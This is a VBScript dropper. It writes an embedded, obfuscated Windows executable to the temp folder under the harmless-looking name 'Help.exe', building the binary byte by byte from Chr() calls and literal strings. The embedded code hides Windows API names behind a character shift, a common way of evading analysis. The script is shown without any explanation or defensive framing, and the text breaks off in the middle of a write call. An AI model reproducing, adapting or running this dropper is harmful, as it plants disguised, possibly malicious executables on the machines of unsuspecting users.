Dim FSO,WSH,OUT,SYS,O
Set FSO=CreateObject("Scripting.FileSystemObject")
Set WSH=CreateObject("WScript.Shell")
SYS=FSO.GetSpecialFolder(2)
Set OUT=FSO.CreateTextFile(SYS&"\Help.exe",True)
Function C(I)
C=Chr(I)
End Function
O=C(0)
Function S(I,J)
S=String(J,I)
End Function
Function N(I)
N=S(O,I)
End Function

OUT.Write("MZ"&O&C(3)&N(3)&C(4)&N(3)&""&O&O&""&N(7)&"@"&N(35)&""&N(3)&C(14)&C(31)&""&C(14)&O&""&C(9)&"!"&C(1)&"L!This program cannot be run in DOS mode."&S(C(13),2)&C(10)&"$"&N(7)&"*ܿDDD@ODWDEDODxBDRichD"&N(24)&"PE"&O&O&"L"&C(1)&C(2)&O&C(23)&C(4)&"uG"&N(8)&""&O&C(15)&C(1)&C(11)&C(1)&C(6)&O&O&"p"&N(3)&C(10)&N(6)&"|"&N(3)&C(16)&N(3)&""&N(4)&"@"&O&O&C(16)&N(3)&C(2)&O&O&C(4)&N(7)&C(4)&N(8)&""&N(3)&C(4)&O&O&"I"&C(2)&C(1)&O&C(2)&N(5)&C(16)&O&O&C(16)&N(4)&C(16)&O&O&C(16)&N(6)&C(16)&N(11)&"}"&O&O&"<"&N(4)&""&O&O&"`"&C(9)&N(75)&C(16)&O&O&","&N(27)&".text"&N(3)&"n"&N(3)&C(16)&N(3)&"p"&N(3)&C(4)&N(14)&" "&O&O&".rsrc"&N(3)&"`"&C(9)&N(3)&""&N(3)&C(10)&N(3)&"t"&N(14)&"@"&O&O&"@"&N(480)&"}"&O&O&C(10)&"~"&O&O&C(30)&"~"&O&O&"~"&O&O&"V~"&O&O&"d~"&O&O&"v~"&O&O&"~"&N(6)&"<~"&N(14)&"Bj"&S("",36)&"lfj"&S("",37)&C(23)&"࿿ֲ-k=k=k=tIj=̈Fj=Io=̈Fm="&C(3)&"Fj=k=e=k=̼=̍Ff=]j=A_e="&C(4)&C(27)&C(21)&C(26)&"k="&S("",24)&C(2)&"%ӽ"&C(18)&"²bϳrҳ²²Ⳳ²²²²²"&S("",12)&"ҳ"&S("",26)&"ӳ"&S("",83)&"Ⲳ&%"&C(23)&C(21)&"b²"&S("",14)&"2㲲&%"&C(23)&C(21)&""&C(18)&"r"&C(18)&""&S("",14)&"򲲒䲲"&C(22)&C(23)&"$%²ҳ"&C(22)&S("",14)&"r"&S("",363)&"Ӿz?"&C(7)&"U"&C(24)&""&C(15)&"س"&C(2)&"SD%"&C(5)&""&C(1)&""&C(6)&C(9)&""&C(4)&""&C(14)&""&C(27)&C(21)&"$!%!"&C(24)&"&"&C(14)&""&C(21)&"&"&C(27)&"("&C(23)&""&C(5)&C(23)&"&"&C(39)&C(34)&C(14)&") %&"&C(19)&S(C(30),2)&C(23)&C(22)&"!"&C(31)&C(34)&"! "&C(23)&" &%"&C(14)&"}vJpOapEjbkni]pekjLrnk_aooMqanuOuopai-Vs@a^qc?phGhianre@_nelpknP]^hau"&C(24)&"iLoe]h"&C(15)&"sh!KlajuBe!I@qlh"&C(4)&C(39)&"aK^)fa_p?na"&C(24)&"{"&O&"At"&C(10)&"R*th"&C(30)&"qK"&C(20)&"p"&C(10)&"Qjhk]`Sqeh)enpqId{"&C(39)&""&C(13)&"3Pd`7kp\"&C(34)&""&C(22)&"*7!"&C(19)&S(C(22),2)&":"&C(22)&C(19)&"&"&C(17)&"!"&C(29)&C(17)&"h15"&C(2)&C(23)&"w"&C(23)&"*"&C(34)&C(30)&"!$"&C(23)&"$"&C(23)&"26iok"&C(39)&C(20)&C(34)&""&C(26)&""&C(39)&"x"&C(12)&")"&C(8)&"p"&C(21)&"q"&C(39)&C(23)&""&C(23)&"+"&C(9)&"$"&C(27)&"&"&C(23)&""&C(27)&""&C(21)&C(34)&C(24)&""&C(10)&"$"&C(21)&"%"&O&C(6)&""&C(22)&C(31)&C(27)&" a(i((8"&C(21)&C(29)&"c"&C(17)&""&C(14)&""&C(21)&"쌷(i%I"&C(9)&"m"&C(39)&")"&C(23)&""&C(39)&"$$8"&C(8)&"%"&C(27)&"B4"&C(31)&""&C(13)&"`"&S(C(34),2)&""&C(2)&""&C(27)&"1Ũ&"&C(30)&C(19)&"%%"&C(23)&""&S(C(6),2)&C(2)&C(14)&"%"&C(29)&"i"&C(26)&C(23)&"!"&C(14)&"!"&C(34)&""&C(14)&C(21)&""&C(31)&C(19)&C(6)&""&C(26)&"q"&C(22)&""&C(19)&"q"&C(29)&C(30)&C(25)&" EA"&C(12)&"lnwb1"&C(9)&"F"&C(25)&"$"&C(19)&C(31)&"%"&C(27)&"$aq"&C(19)&"ݍ"&C(4)&C(39)&""&C(7)&"=i5"&C(6)&C(8)&"="&C(39)&"="&C(8)&"5"&C(39)&"?"&C(2)&""&C(8)&""&C(14)&""&C(39)&"J?8̳Cȝ"&C(9)&C(28)&""&C(11)&"r?/^]m?"&O&"]"&C(24)&"=y^"&O&C(24)&";?--"&C(2)&""&S(C(2),2)&C(4)&""&C(2)&C(3)&C(2)&"έ%"&C(7)&"7r"&C(17)&"&="&C(28)&";8Ҵ1-"&C(25)&"1"&C(10)&C(16)&"{t9"&C(3)&"7"&C(28)&""&C(2)&C(28)&"ԋ 䮴)f78x"&C(21)&""&C(22)&"}Ȱ)!"&C(22)&C(39)&""&C(30)&"i"&C(4)&O&""&C(23)&"oh/A"&C(19)&""&C(34)&"J"&C(31)&"(QS-jh "&C(8)&"-%f?X0"&C(25)&"k!*"&C(9)&"4gqC"&C(14)&C(39)&"%}m"&C(4)&""&C(23)&C(31)&"N-Ʊ=ɩ^7^["&C(6)&C(26)&"[B"&C(13)&C(22)&""&O&"&դ"&C(29)&""&C(1)&O&"&h!M"&C(14)&""&C(18)&"UYҵ-_"&C(27)&C(20)&"<ibD"&C(9)&"")
OUT.Write("ӶSc"&C(27)&")%"&C(25)&" "&C(4)&"OE螓ix24"&C(3)&"IVibՁz"&O&"9"&C(39)&C(31)&"*&F+"&C(31)&"){عKY "&C(19)&C(20)&""&C(39)&"g?&"&C(27)&"i"&C(29)&""&C(28)&"&&"&C(25)&""&C(21)&C(19)&C(25)&"_ge"&C(34)&"F"&C(13)&"g-,$$("&C(9)&C(27)&"u4"&C(29)&""&C(9)&C(19)&"("&C(27)&")"&C(8)&"z"&C(14)&""&C(25)&"gm"&C(31)&C(39)&""&C(30)&"&&"&C(34)&C(39)&""&C(24)&"!J߹"&C(21)&""&C(39)&"%("&C(21)&C(26)&"bG!."&C(4)&"dGoH"&C(29)&"W"&C(5)&C(2)&""&C(11)&"5R"&C(1)&", "&C(29)&""&O&"8"&C(13)&"R"&C(23)&""&C(19)&"h%q4"&C(31)&"u%"&C(27)&"-e"&C(21)&"`1׊+!he"&C(4)&"B󸫹"&O&"c"&C(22)&""&C(22)&""&C(14)&"b"&C(21)&""&C(22)&".%"&C(13)&"(H"&C(39)&C(27)&"*ۂl%"&C(2)&""&C(29)&""&C(8)&""&O&"~"&C(24)&"uQj{s3"&C(6)&C(23)&"b֩;?+߂8ͺ"&C(28)&"%"&C(30)&"f "&C(24)&"&"&C(6)&"0G"&C(2)&C(14)&"8"&C(31)&"^"&C(25)&""&C(14)&"(#R"&C(39)&C(20)&C(39)&C(25)&""&C(9)&"j"&C(26)&""&C(13)&"&2"&C(5)&C(26)&C(4)&"c5Y х)*T "&C(5)&""&C(4)&"V_kXf"&C(12)&","&C(5)&"bXΩ"&C(27)&C(2)&"յi)"&C(25)&"B#"&C(13)&C(23)&C(30)&"%뎹"&C(27)&"䵋"&C(26)&C(28)&"A"&C(34)&"$"&C(39)&C(28)&""&C(29)&"c)"&C(27)&""&C(1)&C(28)&"pM"&C(27)&C(24)&"$M&"&C(19)&"qk"&C(30)&""&C(2)&""&C(1)&"pO"&C(31)&""&C(26)&"%"&C(17)&""&C(19)&"-e"&C(2)&""&S(C(5),2)&C(9)&C(1)&"K"&C(13)&"%e"&C(7)&""&C(21)&"M,,"&C(14)&"Ҳ"&C(8)&""&C(13)&""&C(9)&"j"&C(8)&"&+r"&C(17)&C(27)&C(18)&"^m.ɪY"&C(22)&"Z۞r"&C(25)&"z#7"&C(13)&"¾"&C(17)&"&)3"&C(5)&""&S(C(9),2)&"!?p"&C(6)&""&C(19)&C(26)&""&C(9)&";7~1"&C(14)&"2"&C(23)&"5v207"&C(7)&" _/L"&C(26)&""&C(9)&C(26)&"kko823==Q"&C(15)&"ZN"&C(22)&C(39)&C(13)&"i"&C(2)&"7Mh^"&C(2)&"ճR"&C(26)&"h9VЅ"&C(28)&"놐0A"&C(28)&""&C(39)&"&x@"&C(26)&"2/&SZ2jmY"&C(39)&"2"&C(2)&"&W"&C(19)&"lT"&C(26)&"Y/M3x"&C(8)&C(39)&C(8)&"0d"&C(13)&""&C(29)&C(21)&C(17)&C(16)&C(13)&"{uq"&C(3)&"5&&ڹ&"&C(19)&C(11)&"l¾"&C(2)&"5"&C(19)&"/%"&C(6)&""&C(10)&"*"&C(17)&"؝Q("&C(11)&C(25)&C(10)&C(15)&"t¡1"&C(8)&""&C(9)&"F"&S(C(8),2)&""&C(26)&"m "&C(8)&C(26)&"k"&C(28)&""&C(11)&" "&C(26)&"fnn5x"&C(2)&"(r"&C(10)&""&C(8)&"J"&C(8)&"h"&C(29)&"l,Ŵ"&C(4)&"S"&C(31)&"_U&M"&C(30)&"^ϼ"&C(2)&"Үg"&C(17)&C(34)&""&C(3)&"?ֲŰꏻA"&C(2)&"SB"&C(11)&"u-A?"&C(39)&"}"&C(26)&"]П->uQ>5׼("&C(14)&""&C(9)&"*B.U[g"&C(28)&"z"&C(12)&"si 35j"&C(39)&C(24)&";4"&C(15)&"9.ujYn"&C(3)&"jY>?"&C(5)&"5"&C(27)&"ii:&^"&C(39)&";"&C(23)&""&C(39)&"~"&C(26)&C(15)&""&C(13)&"("&C(26)&C(2)&"ގu@7mŁu"&C(15)&"N"&C(28)&"7"&C(1)&C(34)&"׼_"&C(18)&"5ͣ"&C(39)&""&C(14)&";XʲˈO"&C(23)&"^/"&C(2)&""&C(34)&C(29)&"z=;h7xh!&"&C(19)&C(8)&C(9)&"H=C?g!i="&C(15)&"С<<susj"&C(15)&"q9}"&C(39)&""&C(10)&";"&C(18)&"%G"&C(19)&"3/)b(I"&C(26)&"&г: N!ܦ-hx"&C(22)&";1a"&C(12)&"r&Қ=5(IAf?:"&S(C(3),2)&C(10)&"@"&C(22)&C(8)&C(17)&C(16)&"u!i"&C(6)&"/5{{`!ݫ?7驱"&C(7)&"=s==5W^OWm/"&C(28)&"5եV=zoobl9r"&C(11)&">^"&C(29)&"6F?y7_@ak"&C(29)&"8X^"&C(34)&"@/VCN="&C(11)&""&C(2)&"%Gx"&C(5)&C(18)&"vkLޡNW^Rąrh"&C(22)&""&C(30)&"ﺠ y=gfxC~ľtP4x"&C(5)&C(7)&C(24)&""&C(9)&"D2[%t"&C(5)&"2"&C(6)&"5mguzw.֮"&C(7)&C(26)&"7tv"&C(28)&C(13)&"lǈ"&O&")~y,*9]"&C(10)&""&C(22)&"{щ"&C(28)&"("&C(28)&""&C(28)&"3~&WO@C͠t"&C(30)&"j9.<<|"&C(39)&"}&<"&C(9)&""&C(2)&")̎j"&C(5)&""&C(39)&"Pr"&C(21)&"iͯ5u&r)q"&C(28)&"4 "&C(9)&"l."&C(15)&C(25)&""&C(20)&"s"&C(25)&""&C(24)&"lR|3y3.gtƦ~"&C(28)&";"&C(14)&"?l蘌G"&C(11)&"i7"&C(10)&"(?&-6c"&C(18)&"0"&C(28)&"#M"&C(29)&"͓"&C(27)&"ᦨ"&C(13)&"5y=lk2*"&C(31)&"X5YM"&C(9)&",8@"&C(24)&"!q&"&C(24)&""&C(2)&"W^-H"&C(28)&" 6J"&C(2)&"?δ"&C(8)&"yRMiROVR#"&C(20)&"y4-%[8Se?V_=)"&C(30)&"Y9WN/Ƿ轊z9E{j0i"&C(20)&"2;ʻ@cFc"&C(5)&"^"&C(13)&"h"&C(13)&"{&ՏV&~h3"&C(11)&"ZX~(YL"&C(22)&"{"&C(14)&".e"&C(5)&"=Έ"&C(9)&"2"&C(14)&"(&^"&C(9)&"}e"&C(7)&"<u"&C(39)&"P2"&C(15)&C(13)&C(17)&"z"&C(29)&"d֫딷y"&C(29)&""&C(17)&C(9)&C(28)&"Z"&C(20)&"S;Vq:ֽs6mֹ:J"&C(10)&""&C(20)&"DAoz;JV^ky&/"&C(21)&"No"&C(39)&C(29)&"5ocM"&C(31)&":Ǿ"&C(12)&C(39)&"b"&C(15)&"x2ͷ7z6O˷b|萉$;7"&C(2)&"d"&C(18)&""&C(22)&"ڷ"&C(34)&"ĵ_}Ŷ"&C(15)&""&C(39)&""&C(12)&"[p"&C(18)&"̸v$N"&C(39)&"%b"&C(39)&"ƻXƼ*ȾA;(/*pJ"&C(30)&"ٽu?F챂o"&C(25)&""&C(18)&"#tbJ"&C(18)&"bOOJBn@6_Sa˂"&C(39)&"f&"&C(3)&C(21)&C(18)&";"&C(8)&"bs"&C(14)&"AjEϏ"&C(28)&C(13)&S(C(9),2)&" "&C(24)&"=O"&C(3)&"i3q"&C(21)&""&C(28)&"hLA"&C(11)&"~h"&C(10)&""&C(4)&"lٸzeٱGC=$"&C(18)&C(1)&"5r(2DӋK]mDzD{B"&C(14)&"vDd⤾"&C(11)&""&C(21)&"?v(s>_c"&C(34)&"|be?"&C(22)&"8"&C(39)&C(6)&"C"&C(28)&C(20)&"tf"&C(26)&"UFFl?"&C(10)&"-F"&C(28)&"="&C(3)&"F"&C(3)&C(5)&": w"&C(24)&"G"&C(6)&"B"&C(34)&C(5)&C(24)&"iُvR:>"&C(17)&"0~"&C(22)&":j"&C(11)&"0"&C(27)&"rܨE>"&C(15)&"mDp"&C(16)&"r"&C(10)&"Έ=ڽOF)Z˶"&C(31)&"|"&C(9)&"7LЪu"&C(11)&"Z@"&C(5)&""&C(1)&""&C(24)&"p}rlMc"&C(2)&">6>"&C(39)&""&O&"Ƃ"&C(6)&"^"&C(18)&"44"&C(21)&"(i("&C(39)&C(10)&"ɞlՍ+K0օM"&C(39)&"ϑ6ͨk"&C(11)&""&C(1)&O&C(27)&""&C(13)&"(Ӧ2"&C(18)&"ٌ9w("&C(6)&"hl"&C(23)&"Ğ"&C(19)&"i"&C(8)&"&"&C(26)&":ũ7u*J,޷"&C(26)&"L"&C(16)&C(8)&"Ѳ2LJk<ai;b-ސo"&C(11)&"&/"&C(18)&""&C(13)&"玩y2̵"&C(29)&""&C(22)&"̷i"&C(39)&"r"&C(8)&"X۽G8"&C(13)&"F"&C(27)&"̹f"&C(19)&""&C(5)&"#"&C(12)&"a"&C(26)&"9"&C(12)&"~"&C(11)&""&C(28))
OUT.Write("=`"&C(20)&""&C(15)&"eiu"&C(5)&"}"&C(39)&"[>jq-"&C(11)&","&C(9)&"u"&C(9)&""&C(10)&""&C(18)&"w(t"&C(11)&"BQKeo"&C(7)&"y&"&C(9)&"H¸@"&S(C(9),2)&"yhV"&C(9)&"RrY`"&C(8)&"hcO"&C(39)&"^T "&C(31)&"Ӛ"&C(2)&"n"&C(2)&""&C(7)&"Z=6?"&C(39)&""&C(12)&"%"&C(13)&"Wecba"&C(29)&"$2WN6%rr"&O&"6\2"&C(11)&";7"&C(6)&"i"&C(34)&"k"&C(11)&"~"&C(20)&"6Q{gr^b"&C(34)&";fȹ5*A9/zWn/дҒ"&C(16)&"BF"&C(29)&">d"&C(27)&"o51V-E_BJ"&C(10)&"Egu嶛"&C(16)&C(19)&C(31)&"D$"&C(13)&"(B"&C(31)&""&C(2)&""&C(18)&"{ V;%؞"&S(C(11),2)&"U"&C(10)&">~bb(r."&C(19)&"ex7"&C(30)&"5/rDKZ`"&C(19)&"UpHM"&C(13)&""&C(39)&"]"&C(10)&"zeFKI3s"&C(10)&"m$h24"&C(39)&"d"&C(4)&""&C(4)&"b{"&C(10)&""&C(6)&"pֹCV9}}"&C(12)&"4~=z;:}o~Ȋ"&C(22)&""&C(11)&"sմqz"&C(13)&"h"&C(11)&"o"&C(6)&"דe"&C(13)&"V"&C(39)&"."&C(19)&"YнҶ0#ם23jbz{jR&"&O&"L&&fK?6,4f:"&C(25)&">:"&C(2)&"d"&C(4)&"4RNr"&C(29)&"e`"&C(3)&":Lg"&C(19)&"9"&C(26)&"g=*Hs=bv6V"&C(24)&"Hz"&O&C(7)&"#"&C(16)&"eÿ"&C(28)&"ZxvĶtي׳ȤBZZt?w9X{<2Y6*s"&C(6)&"{"&C(25)&C(16)&"`7n"&C(2)&""&C(24)&"P"&C(4)&"R3"&C(31)&"k62&"&C(29)&"r+:?4::|b4"&C(25)&"At"&C(22)&"zۭPB_2Rǲ#"&C(22)&"D66"&C(20)&""&C(18)&"C-Dtд{"&C(10)&""&C(15)&"e"&C(30)&"vbS02%K"&C(4)&"})f!{v"&C(26)&"r"&C(27)&""&C(17)&"jq"&C(30)&"҆=?o*?kog"&C(30)&"!Wj"&C(26)&"v"&C(19)&"K"&C(22)&""&C(22)&"+"&C(22)&"uՂA.ѹ(^"&C(17)&"#"&C(24)&""&C(39)&"x"&C(1)&""&C(30)&C(19)&""&C(22)&""&C(9)&"ELӞ"&O&""&C(22)&""&C(27)&"B"&C(15)&""&C(13)&""&C(28)&"j"&C(22)&"Eorn"&C(27)&"ŧŧ"&C(21)&""&C(6)&"7"&C(39)&C(19)&""&C(27)&"Ԟwб{"&C(5)&"/"&C(11)&"uU"&C(24)&""&C(13)&"bJ"&C(2)&"B\u"&C(28)&" "&C(11)&C(26)&"/o"&C(16)&"-&"&C(15)&"5W"&C(7)&"zz"&C(10)&".jچ"&C(24)&"s"&C(10)&"5"&O&"k"&C(28)&"="&C(11)&"-r)5?n"&C(6)&"\xƮ?"&C(34)&"{*{C"&C(21)&"׶"&C(5)&"ʮ"&C(18)&"娐"&C(27)&"@ Nip&"&C(39)&C(7)&C(28)&""&C(19)&"-"&C(24)&"l"&C(11)&"~=?"&C(18)&"z"&C(3)&""&C(11)&"#Ļ?вMd"&C(28)&""&C(6)&"="&C(12)&"?̾MsSkd4}F^Ǌ"&C(39)&C(16)&""&C(23)&"-ʺ=&"&C(4)&""&C(30)&"͋"&C(8)&C(14)&"z"&C(10)&"򵞭8,"&C(20)&"oή3nt/$Y($"&C(24)&"(lbo!"&C(39)&"\"&C(23)&"E"&O&"="&C(9)&"z"&C(19)&"ʨs7B~"&C(9)&"f=e3`G*g4rr2uSn@G[[bTdՆ[@V"&C(26)&"zp!r"&C(18)&">zi"&C(25)&"$"&C(4)&"oefKndB"&C(11)&C(12)&"2X"&C(18)&""&C(17)&C(22)&"b"&C(16)&"6=*^Ϸd5nnPjgn"&C(25)&"-"&C(23)&"􊽳:Df2"&C(22)&"rR"&C(30)&C(17)&C(19)&"{"&C(22)&"f~=@$ֿѻ[[/:3r="&C(30)&C(34)&"v"&C(30)&"s"&C(3)&"^"&C(17)&"x"&C(19)&"+ҿ&B*"&O&O&".bBh"&C(4)&"5:"&C(22)&"v"&C(11)&"L"&C(3)&"\Be"&C(10)&"rFf"&C(39)&"yRnze"&C(16)&"z"&C(14)&C(22)&"MKz"&C(25)&"E9"&C(30)&"L"&O&"y@V;"&C(3)&C(18)&""&C(10)&".zR"&C(24)&"-hؼ搥˼"&C(30)&"*W51]违KIG@?=y"&C(15)&"W"&C(14)&";"&C(21)&"5k/(3"&C(12)&"=L"&C(8)&"?GZa"&C(34)&""&C(28)&"y"&C(28)&C(11)&"ĻhI,3+="&C(7)&""&C(4)&"."&C(3)&""&C(20)&""&C(26)&"<⹔"&C(1)&"f"&C(14)&"W"&C(9)&"?"&C(12)&""&C(29)&"]kX>vѻ"&C(34)&"&ĢWu }޽k$M43zz"&C(21)&"3Aps½zi"&C(3)&C(5)&""&C(17)&""&C(14)&"w6?"&C(3)&C(8)&""&C(20)&"AO=o"&C(15)&"-"&C(14)&""&C(2)&""&C(28)&"k"&C(16)&"Tݦs Zy"&C(20)&S(C(3),2)&C(8)&C(28)&"V5"&C(23)&"eUS7&R"&C(29)&"@m"&C(8)&"g"&C(29)&"ʮ"&C(11)&"8تS"&C(28)&"ոxR="&C(6)&"k]"&C(31)&C(28)&C(39)&"i"&C(18)&"m;"&C(15)&"G"&C(8)&"&"&C(28)&"6"&C(10)&"f|F݂v"&C(18)&"j"&C(2)&"P"&C(3)&"h_˖l;/͆b"&C(30)&"M*R"&C(9)&"pK:uւk3=("&C(22)&"hB"&C(25)&"ܮ1c~"&C(14)&"ߊ"&C(20)&"Ax"&C(30)&"(;!"&C(26)&""&C(3)&"f"&C(19)&""&C(12)&"ˮq3~L@\"&C(22)&""&C(15)&"&"&C(22)&"sݾ=g"&C(22)&"7iRb"&C(11)&"ݨ"&C(3)&O&""&O&""&C(28)&""&C(2)&C(9)&"5="&C(39)&""&C(26)&"L7`~"&C(5)&"*!"&C(20)&C(39)&""&C(9)&C(17)&"&b"&C(29)&"s"&C(9)&C(21)&C(39)&"!_ˌ;"&C(20)&C(26)&""&C(24)&C(1)&C(25)&C(34)&"&WL"&C(39)&"p"&C(8)&"dJ"&C(39)&"ׂU߿"&C(25)&"N"&C(14)&"("&C(39)&""&C(9)&""&C(7)&"~:9;b>3"&C(4)&C(31)&""&C(16)&"!"&C(19)&"ߵd"&C(19)&""&C(19)&"."&C(39)&"φc鎭"&C(26)&C(19)&C(8)&"jsX!^"&C(24)&";0|*"&C(8)&"RB"&C(9)&""&C(11)&"&6*W~"&C(23)&"ZR2"&C(3)&"O<ƽ@YmOR"&C(26)&"7);"&C(26)&")@F"&C(25)&"ɋ*5"&C(22)&"p֜3J"&C(8)&"֢&S"&C(10)&""&C(3)&C(5)&"!иS19#͞&"&C(28)&"NO"&C(8)&"W"&C(18)&"3F"&O&",*"&C(11)&""&C(30)&"/l)&o"&O&"4"&C(24)&"eɑ"&C(16)&"3v"&S(C(14),2)&"vuӆR"&C(39)&C(34)&"A&ٓ"&C(39)&"#"&C(14)&"¾4"&C(28)&"SN"&O&"TJwJ6"&C(26)&"=;r%Oz"&C(39)&"FCrJ$"&C(5)&"lqݖs"&C(6)&C(17)&C(3)&"V"&C(18)&"darV"&C(17)&""&C(16)&""&C(30)&"7"&C(19)&"ѫ"&C(29)&"V"&C(3)&"h"&C(26)&"چՃ"&C(19)&"N"&C(9)&"V"&C(18)&C(39)&"36=/7"&C(11)&"wX~"&C(8)&"u^h"&C(9)&"@N&"&C(20)&""&C(28)&C(1)&C(30)&"VXo]"&C(19)&"N/؉s=C"&C(27)&"aR"&C(16)&"Ms"&C(20)&"5VrN-wzD*?"&C(31)&""&C(39)&"V"&C(29)&""&C(7)&C(3)&"ƒ:ܳ"&C(9)&"qE2"&C(11)&"ؘNǳ)0"&C(5)&" gM"&O&" 2"&C(19)&"j$kr"&C(17)&"M"&C(13)&"I}"&C(16)&""&C(13)&"{"&C(10)&"t:N"&C(15)&"*5u"&C(2)&C(4)&"nY"&C(12)&"J+mڷ.½?s"&C(10)&"ޭS=u=s2"&C(9)&";$"&C(10)&"S"&C(31)&"1742ævL=y=ݷ"&C(24)&"MU݃tQ"&C(3)&"h"&C(31)&"7)"&C(28)&""&C(8)&"R.Z=݀"&C(17)&"<%7ƛ"&C(1)&C(39)&"Hg L`"&C(1)&")P<"&C(7)&C(25)&"6:"&C(14)&"ńxj18<"&C(3)&"."&C(14)&""&C(15)&"2nK"&C(39)&"4ߖVrouA=ߥ"&C(12)&"&uTi38"&C(2)&C(23)&"^괛"&C(20)&"q#"&C(22)&C(2)&""&C(9)&""&C(30)&"U\")
OUT.Write(C(14)&"bl"&C(17)&":.ʦ"&C(2)&"i/Ģ`5"&C(6)&"9ˌyֽ"&C(22)&"2z2+{Bz2n"&C(2)&"{2~nSd;ƅboӿcʽ"&C(30)&"xVѢDI/&0Jn:׵"&C(34)&C(18)&"n"&C(22)&"ҷ"&C(4)&"z2ų+7un6!Ԏ޹z-BÉ"&C(11)&"A"&C(16)&C(17)&C(15)&"|"&C(13)&"3vu6J"&C(9)&"4-"&C(16)&"JFBC"&C(31)&"{®p?ξ6"&C(18)&C(8)&"Af5{h"&C(21)&"vJ"&C(18)&"JӦˬ3"&C(8)&"2"&C(39)&"帗5"&C(31)&C(20)&""&C(7)&C(28)&C(7)&"_"&C(30)&"ְ֘G8"&C(28)&""&C(9)&""&C(8)&"koQ?"&C(24)&"|&Zr=;ۺL>?"&C(8)&"½"&C(9)&"Sj"&C(3)&"MLBF"&C(11)&"=c:5Syl˶7"&O&""&C(24)&"Z"&C(2)&"Փ|p"&C(24)&";"&C(2)&"D|ʢ@vo"&C(34)&"8*"&C(1)&"0"&C(10)&C(7)&"ѺY"&C(18)&"efo&˼"&C(19)&"b6F^25W"&C(34)&"Ѹ"&C(30)&C(6)&"׀2["&C(18)&""&C(17)&"y/T"&C(10)&""&S(C(12),2)&"Ձzz"&C(14)&S(C(11),2)&C(13)&">>$("&C(13)&"]Z$$$$["&C(22)&"."&C(1)&".\5VS"&C(14)&"5.j"&C(23)&"[bO"&C(39)&""&C(16)&C(18)&"9"&C(10)&"YE;?ĒӞ"&C(7)&"A"&C(14)&C(25)&""&C(7)&"2:m0>5򝬪ʦǳ"&C(28)&"y7"&C(6)&"JV"&C(6)&C(20)&"R"&C(9)&"Ȑ4g"&C(6)&"oZh"&C(26)&">2&F=3ʞ"&C(31)&"-[H(Z5sd"&C(18)&"uxnԜ&P"&C(4)&"5A"&C(2)&"-t"&C(19)&"?["&C(13)&":ZͤR>"&C(22)&"t"&C(34)&"bt^"&C(11)&"ު.~MyiBEf/rʲ&$D"&C(21)&C(17)&"^Ȼ(#n{"&C(18)&"/"&C(28)&"=^"&C(10)&"["&C(31)&"kǀ(;tv"&C(29)&"rTzz^Y"&S(C(2),2)&""&C(21)&">IT[f"&C(9)&C(14)&"^>"&C(5)&"V"&C(11)&C(27)&">3nV)"&C(21)&"xr"&C(26)&"asa,"&C(31)&"DK@"&C(18)&"~a"&C(20)&"ʑ=Y"&O&C(22)&"e"&C(28)&"kmf <7"&C(11)&""&S(C(22),3)&"%"&C(29)&C(24)&S(C(22),2)&""&C(39)&"н7P"&C(16)&"b!W"&C(10)&"+Ds1"&C(39)&"kϼ"&C(28)&"Po"&C(29)&"K⾔Q{"&C(27)&"r"&C(18)&"`˶"&C(21)&"dx]"&C(19)&C(20)&"W"&C(10)&"stu?:JQ9:y]]ٱ"&C(34)&""&C(29)&"޺?cy0<5//+"&C(39)&"/"&C(10)&C(1)&"}`"&C(22)&"/҂4"&C(39)&"0Ƈ3k="&C(2)&"[ssӶb"&C(11)&"ss -d"&C(39)&"A&#"&C(9)&""&C(34)&"Ge"&C(11)&"BC"&C(29)&" =63a"&C(6)&"LP޶A}"&C(20)&"9̒<n̨"&C(13)&""&C(22)&""&C(19)&""&C(12)&"vP;s(eң"&C(25)&"(.3>&"&S(C(34),2)&"(*I"&C(17)&"Y"&C(34)&"]S"&C(19)&"t"&C(17)&"5QƐϚy2Os"&C(26)&"k"&C(24)&"R.z( &"&C(34)&"Kb"&C(8)&"f"&O&"a"&C(7)&"rx,ż^"&C(21)&"-Z"&C(20)&""&O&"EmڦZ"&C(28)&C(11)&"2:"&C(26)&"J"&C(19)&""&C(24)&"*2"&C(7)&""&C(18)&C(23)&"G4<"&C(34)&"@"&C(7)&"3yr"&C(19)&"5(sӴ"&C(34)&"6/"&C(10)&"B"&C(5)&"z"&C(14)&""&C(14)&"zHu;Cθ"&C(20)&"Y"&C(6)&"6"&C(16)&""&C(10)&"i֖bʽĺwژr̐|"&C(4)&"wwF"&C(19)&"*q~ܵ"&C(25)&"o|"&C(14)&""&C(23)&"n9"&C(39)&"K+$B"&C(26)&""&C(1)&"ѝҮ"&C(1)&"Ү!PlHVewTcrƞ6r¼zc%]ZL"&C(10)&"麖"&C(5)&"ʮήnʮcNT"&C(2)&C(8)&"=&ֺ"&C(9)&""&O&"T=]"&C(24)&"y?"&C(30)&C(21)&":%"&C(24)&";NRĳhh"&C(10)&"شض23y"&C(5)&"x("&C(13)&"χQ:["&C(15)&""&C(16)&"2[4|fF,N:"&C(9)&"q"&C(9)&""&C(25)&"8@"&C(5)&"X+hT"&C(21)&"2"&C(26)&C(9)&""&C(25)&"L޼6-xh"&C(8)&"S"&C(14)&"<"&C(10)&C(8)&"s2h"&C(11)&"̝"&C(9)&">s]Ӧ9O"&C(29)&"`"&C(7)&""&S(C(5),2)&""&C(27)&"K"&C(17)&C(29)&"Z0o?"&C(5)&";S2>.|b"&C(11)&C(39)&"[q"&C(7)&""&C(4)&"aub~֞>"&C(6)&""&C(10)&""&C(8)&"xLz"&C(10)&"C"&C(18)&""&C(18)&"˖B"&C(17)&""&C(17)&">?Z][om[t"&C(28)&"[~zzz"&C(39)&"+d}:"&C(3)&"ZVZIk?:fRgO"&C(2)&"l="&C(18)&")j>"&C(8)&C(28)&"v"&C(5)&"U"&C(5)&""&S(C(21),2)&"!"&C(18)&""&C(28)&C(14)&C(2)&C(30)&"Iٳ!"&C(11)&C(34)&""&C(24)&C(30)&"R"&C(29)&"F]"&C(8)&".a@"&C(8)&")"&O&"ǝ\b"&C(34)&"Lx"&C(27)&"Z"&C(9)&"U})-"&C(39)&C(5)&"֑"&C(28)&""&C(11)&"x7<+"&C(24)&""&C(11)&">"&C(2)&""&C(24)&"^w"&C(10)&"~~"&C(22)&"xq"&C(25)&""&C(12)&"3W"&C(15)&"4"&C(14)&""&C(19)&"|?o,h;gVk@z"&C(2)&"hiPu_O{S"&S(C(24),2)&C(29)&"2o"&C(12)&"F:ך3"&C(29)&" "&C(26)&"dâFDRln&"&C(5)&"(nd 